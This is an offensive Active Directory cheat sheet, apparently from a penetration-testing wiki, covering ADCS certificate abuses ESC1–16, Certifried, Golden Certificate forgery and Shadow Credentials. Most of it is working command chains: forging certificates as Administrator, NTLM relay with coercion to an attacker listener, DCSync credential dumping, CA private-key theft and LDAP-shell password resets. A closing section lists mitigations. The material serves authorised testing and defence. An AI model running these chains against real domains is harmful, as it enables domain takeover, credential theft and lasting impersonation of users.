# ADCS Attacks (ESC1–16)

Active Directory Certificate Services issues the certificates that back smart-card logon, code signing, and PKINIT. A single misconfigured template or over-permissive CA can turn any domain user into Domain Admin, and certificates may remain useful after password resets. When a CA is in scope, `certipy find -vulnerable` is an important reconnaissance step after obtaining credentials.

{% hint style="warning" %}
Certificate auth is clock-sensitive like all Kerberos. If `certipy auth` fails with a skew error, `sudo ntpdate <DC_IP>` first. ESC16 detection needs Certipy v5.0.2+; `shadow auto` is broken on some v5 builds — pin `certipy-ad==4.8.2` for shadow credentials.
{% endhint %}

## The ESC vulnerabilities at a glance

| ESC | Misconfiguration | Precondition |
| --- | --- | --- |
| **ESC1** | Template allows enrollee-supplied SAN + Client Auth EKU | Low-priv enroll right |
| **ESC2** | Template with Any Purpose / no EKU | Low-priv enroll right |
| **ESC3** | Enrollment Agent template | Enroll right → request on behalf of others |
| **ESC4** | Writable template DACL | `GenericWrite`/`WriteDacl` on template → make it ESC1 |
| **ESC5** | Writable CA-related AD objects | Control of CA server object / PKI containers |
| **ESC6** | `EDITF_ATTRIBUTESUBJECTALTNAME2` on CA | CA flag set → SAN abuse on any template |
| **ESC7** | `ManageCA` / `ManageCertificates` rights | Approve your own denied SubCA request |
| **ESC8** | HTTP web enrollment enabled | NTLM relay to `/certsrv` |
| **ESC9** | No security extension on template | Weak cert mapping |
| **ESC10** | Weak cert mapping registry keys | UPN abuse |
| **ESC11** | RPC enrollment relay (IF_ENFORCEENCRYPTICERTREQUEST off) | Relay to ICPR |
| **ESC13** | Template maps to a group via OID | Enroll grants group membership |
| **ESC15** | Schema-v1 template + app-policy injection | CVE-2024-49019, enrollee-supplies-subject |
| **ESC16** | `szOID_NTDS_CA_SECURITY_EXT` disabled CA-wide | UPN swap on a controlled user |

## Enumerate with Certipy

```bash
# Find vulnerable templates (readable summary)
certipy find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout

# Full output to JSON / BloodHound
certipy find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -output certipy_output
certipy find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -bloodhound

# Hide noise, list a CA's config
certipy find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -hide-admins
certipy ca -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -ca '<CA_NAME>' -list

# Kerberos-only (NTLM disabled)
certipy find -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout -k -target <DC_FQDN>
```

```powershell
# Windows — Certify
Certify.exe find /vulnerable
Certify.exe find
```

```powershell
# Template enumeration via PowerView
Get-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<TLD>" | select name
```

## ESC1 — enrollee-supplied SAN

The template lets a low-priv user enroll, has a Client Authentication EKU, and allows the requester to specify a Subject Alternative Name. Request a cert with `-upn administrator` and you authenticate as Administrator.

```bash
# Certipy
certipy req -u <USER>@<DOMAIN> -p '<PASSWORD>' -ca <CA_NAME> \
  -template VulnerableTemplate -upn administrator@<DOMAIN> -dc-ip <DC_IP>

# Authenticate with the issued cert (PKINIT → TGT + NT hash)
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

```powershell
# Windows — Certify
Certify.exe request /ca:<CA_FQDN>\<CA_NAME> /template:VulnerableTemplate /altname:administrator
```

### ESC1 via a fake computer account

When `Domain Computers` can enroll on the template, add a machine account (default `MachineAccountQuota` = 10) and enroll as it:

```bash
# 1) Create a machine account
impacket-addcomputer <DOMAIN>/<USER>:'<PASS>' \
   -computer-name 'FAKE01$' -computer-pass 'Password123!' -dc-ip <DC_IP>

# 2) Request a cert as any user via SAN abuse
certipy req -u 'FAKE01$'@<DOMAIN> -p 'Password123!' \
   -dc-ip <DC_IP> -ca <CA_NAME> -template CorpVPN -upn administrator@<DOMAIN>
```

{% hint style="info" %}
**PassTheCert fallback** — when PKINIT fails with `KDC_ERR_PADATA_TYPE_NOSUPP`, split the PFX and drive an LDAP shell over Schannel instead:

```bash
certipy cert -pfx administrator.pfx -nokey -out admin.crt
certipy cert -pfx administrator.pfx -nocert -out admin.key
python3 passthecert.py -action ldap-shell -crt admin.crt -key admin.key -domain <DOMAIN> -dc-ip <DC_IP>
# > add_user_to_group svc_ldap "Domain Admins"
# > change_password administrator P@ssw0rd123!
```
{% endhint %}

## ESC2 — dangerous EKU

Same enrollment path as ESC1, but the template carries an Any Purpose or Sub CA EKU (or no EKU), so the cert is usable for authentication regardless of SAN handling.

```powershell
Certify.exe request /ca:<CA_FQDN>\<CA_NAME> /template:VulnerableTemplate /altname:Administrator
```

## ESC3 — Enrollment Agent

The template grants the Certificate Request Agent EKU, letting you request certs on behalf of other users.

```powershell
# Request the enrollment-agent cert
Certify.exe request /ca:<CA_FQDN>\<CA_NAME> /template:EnrollmentAgent

# Use it to request an admin cert on behalf of the admin
Certify.exe request /ca:<CA_FQDN>\<CA_NAME> /template:VulnerableTemplate /altname:administrator /onbehalfof:<DOMAIN>\administrator
```

## ESC4 — writable template

You hold `GenericWrite`/`WriteDacl`/`WriteOwner` on a template. Rewrite it into an ESC1 (enable enrollee SAN + Client Auth), exploit, then restore.

```powershell
Get-DomainObjectACL -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<TLD>" -ResolveGUIDs
Set-DomainObjectAcl -TargetIdentity <TEMPLATE> -PrincipalIdentity <USER> -Rights All
```

```bash
# Certipy can weaponize and restore ESC4 in one shot
certipy template -u <USER>@<DOMAIN> -p '<PASS>' -template <TEMPLATE> -save-old -dc-ip <DC_IP>
# ...request as ESC1..., then restore:
certipy template -u <USER>@<DOMAIN> -p '<PASS>' -template <TEMPLATE> -configuration <TEMPLATE>.json -dc-ip <DC_IP>
```

## ESC7 — ManageCA officer + SubCA issue-request

The highest-value single ADCS chain: your user has `ManageCA` but can't edit templates. Add yourself as a CA officer, submit a SubCA request (denied by design), approve your own request, then retrieve the cert.

```bash
# 1) Confirm ManageCa rights
certipy find -u <USER>@<DOMAIN> -p "<PASS>" -dc-ip <DC_IP> -vulnerable -stdout

# 2) Grant self "officer" (Manage Certificates) on the CA
certipy ca -ca <CA_NAME> -add-officer <USER> -username <USER>@<DOMAIN> -p "<PASS>"

# 3) Request SubCA (denies by design — answer 'y' to save the private key). Note the request ID.
certipy req -ca <CA_NAME> -target <DC_FQDN> -template SubCA \
        -upn administrator@<DOMAIN> -username <USER>@<DOMAIN> -p "<PASS>"

# 4) As officer, approve your own denied request
certipy ca -ca <CA_NAME> -issue-request <REQ_ID> -username <USER>@<DOMAIN> -p "<PASS>"

# 5) Retrieve the issued cert
certipy req -ca <CA_NAME> -target <DC_FQDN> -retrieve <REQ_ID> -username <USER>@<DOMAIN> -p "<PASS>"

# 6) Authenticate
sudo ntpdate <DC_IP>
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

## ESC8 — HTTP web enrollment relay

When ADCS web enrollment is exposed over HTTP, relay a coerced machine's NTLM auth to `/certsrv` and request a cert as that machine (e.g. a DC), then authenticate as it. Coercion methods live in [Relay and Coerce](relay-and-coerce.md).

```bash
# Terminal 1 — certipy relay to the web enrollment endpoint
certipy relay -target 'http://<DC_HOSTNAME>/' -template DomainController

# Terminal 2 — coerce the DC (Kerberos-aware, works even with NTLM disabled outbound)
netexec smb <DC_HOSTNAME> -u <USER> -p '<PASS>' -k \
  -M coerce_plus -o LISTENER=<ATTACKER_IP> METHOD=PetitPotam

# Relay drops the DC PFX — authenticate with it
sudo ntpdate <DC_IP>
certipy auth -pfx <DC>.pfx -dc-ip <DC_IP>

# DCSync using the DC$ ticket
KRB5CCNAME=<DC>.ccache secretsdump.py -k -no-pass <DOMAIN>/'<DC>$'@<DC_FQDN> -just-dc-user administrator
```

Classic Impacket relay equivalent:

```bash
python3 ntlmrelayx.py -t http://<CA_SERVER>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

## ESC15 — schema-v1 + application-policy injection (CVE-2024-49019)

A schema-version-1 template with `EnrolleeSuppliesSubject`. Inject the Certificate Request Agent EKU via application policies, then use that agent cert to enroll on behalf of any user.

```bash
# 1) Request cert with injected application policy
certipy req -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip <DC_IP> \
   -target <DC> -ca <CA> -template WebServer -upn administrator@<DOMAIN> \
   -application-policies 'Certificate Request Agent'

# 2) Use the agent PFX to enroll on behalf of Administrator
certipy req -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip <DC_IP> \
   -target <DC> -ca <CA> -template User \
   -pfx administrator.pfx -on-behalf-of '<DOMAIN>\Administrator'

# 3) Authenticate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

## ESC16 — security extension disabled CA-wide

The CA has `szOID_NTDS_CA_SECURITY_EXT` (1.3.6.1.4.1.311.25.2) disabled, so strong certificate mapping isn't enforced and the UPN alone determines identity. If you hold `WriteProperty` on a target's UPN (often via a cert-operator group like `ca_svc`), swap the UPN to administrator, enroll, then restore.

```bash
# Pin a working certipy for shadow auto if needed
pip install certipy-ad==4.8.2 --break-system-packages --force-reinstall
certipy shadow auto -u <USER>@<DOMAIN> -p '<PASS>' -account <TARGET> -dc-ip <DC_IP>
# msDS-KeyCredentialLink → extracted NT hash

pip install certipy-ad --upgrade --break-system-packages
certipy find -u <USER>@<DOMAIN> -hashes :<NT> -vulnerable -stdout   # flags ESC16

# UPN swap → request cert → restore
certipy account -u <CTRL>@<DOMAIN> -hashes :<CTRL_NT> -user ca_svc -upn administrator update
certipy req     -u ca_svc@<DOMAIN> -hashes :<NT> -dc-ip <DC_IP> -target <DC> -ca <CA> -template User
certipy account -u <CTRL>@<DOMAIN> -hashes :<CTRL_NT> -user ca_svc -upn ca_svc@<DOMAIN> update  # restore
certipy auth    -dc-ip <DC_IP> -pfx administrator.pfx -u administrator -domain <DOMAIN>
```

## Certifried (CVE-2022-26923)

Set a controlled machine account's `dNSHostName` to match a DC, enroll a machine cert, and authenticate as the DC.

```bash
# 1. Create/control a machine account
addcomputer.py -computer-name 'FAKE$' -computer-pass '<PASS>' '<DOMAIN>/<USER>:<PASS>'

# 2. Point dNSHostName at a DC (needs GenericWrite on the computer object)
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASS>' set object 'FAKE$' --attr dNSHostName -v '<DC_FQDN>'

# 3. Request a cert with the DC identity
certipy req -u 'FAKE$@<DOMAIN>' -p '<PASS>' -ca <CA_NAME> -template Machine -dc-ip <DC_IP>

# 4. Authenticate as the DC
certipy auth -pfx <DC_HOSTNAME>.pfx -dc-ip <DC_IP>
```

## Golden Certificate (persistence)

Steal the CA's private key and forge certificates for anyone, forever — the KRBTGT-golden-ticket equivalent for PKI. Survives password changes and KRBTGT rotation.

```bash
# Back up the CA cert + private key
certipy ca -u 'administrator@<DOMAIN>' -p '<PASSWORD>' -ns '<DC_IP>' \
  -target '<CA_FQDN>' -config '<CA_FQDN>\<CA_NAME>' -backup
```

```powershell
# Windows alternatives
certutil -backupKey -f -p '<PASSWORD>' C:\Windows\Tasks\CaBackupFolder
mimikatz # crypto::certificates /export
```

```bash
# Forge a cert with the stolen CA key
certipy forge -ca-pfx '<CA_NAME>.pfx' -upn 'administrator@<DOMAIN>' -sid 'S-1-5-21-...-500' -crl 'ldap:///'
```

```powershell
# ForgeCert
ForgeCert.exe --CaCertPath "ca.pfx" --CaCertPassword "<PASSWORD>" --Subject "CN=User" --SubjectAltName "administrator@<DOMAIN>" --NewCertPath "admin.pfx" --NewCertPassword "<PASSWORD>"
```

```bash
# Use the forged cert
certipy auth -pfx 'administrator_forged.pfx' -dc-ip '<DC_IP>'
```

## Shadow Credentials (certipy shadow auto)

With `GenericWrite`/`GenericAll` over a target, inject a KeyCredential to get their TGT + NT hash without touching their password. Also covered from the ACL side in [ACL Abuse](acl-abuse.md#shadow-credentials-msds-keycredentiallink).

```bash
certipy shadow auto -u <USER>@<DOMAIN> -p '<PASSWORD>' -account <TARGET_USER> -dc-ip <DC_IP>
# → <TARGET>.ccache + NT hash

certipy shadow auto -u <USER>@<DOMAIN> -hashes :<HASH> -account <TARGET_USER> -dc-ip <DC_IP>
```

## Pass-the-Certificate, PKINIT & UnPAC-the-Hash

A certificate is a credential. Turn it into a TGT (PKINIT), or extract the NT hash straight out of the PAC.

```bash
# PKINIT → TGT (Certipy auto-performs UnPAC-the-Hash and prints the NT hash)
certipy auth -pfx <USER>.pfx -dc-ip <DC_IP>

# Schannel LDAP shell (no PKINIT needed)
certipy auth -pfx <USER>.pfx -dc-ip <DC_IP> -ldap-shell

# PKINITtools — get NT hash from an AS-REP key
python3 getnthash.py <DOMAIN>/<USER> -key <AS-REP_KEY> -dc-ip <DC_IP>
```

```powershell
# Rubeus
Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /certificate:<PFX_PATH> /password:<PFX_PASSWORD> /ptt
```

## Mitigation (for the report)

* **Templates** — restrict enrollment to authorized principals; remove enrollee-supplied SAN and dangerous EKUs (Any Purpose, Code Signing); require manager approval.
* **CA** — tighten the CA DACL (no low-priv `ManageCA`/`ManageCertificates`); disable `EDITF_ATTRIBUTESUBJECTALTNAME2`; enable audit logging.
* **Web enrollment** — disable HTTP; require HTTPS + Extended Protection for Authentication (kills ESC8).
* **Mapping** — enforce the strong-mapping security extension (`szOID_NTDS_CA_SECURITY_EXT`); apply the May 2022 KB (KB5014754) in Full Enforcement.
* **Audit** with `certipy find -vulnerable` regularly; disable unused templates.

## Related

* [Active Directory](AD.md) — AD structure and where PKI fits
* [AD Attacks](ad-attacks.md) — the full domain-compromise chain; where to slot ADCS
* [Kerberos Attacks](kerberos-attacks.md) — PKINIT, S4U, and golden tickets that certs feed
* [ACL Abuse](acl-abuse.md) — writable templates/CA objects and shadow credentials
* [Relay and Coerce](relay-and-coerce.md) — PetitPotam / PrinterBug for the ESC8 relay chain
* [CrackMapExec / NetExec](crackmapexec-netexec.md) · [Credential Dumping](credential-dumping.md) · [Lateral Movement](lateral-movement.md)
* [Password / Hash Attacks](password-hash-attacks.md) · [Report Writing](report-writing.md)
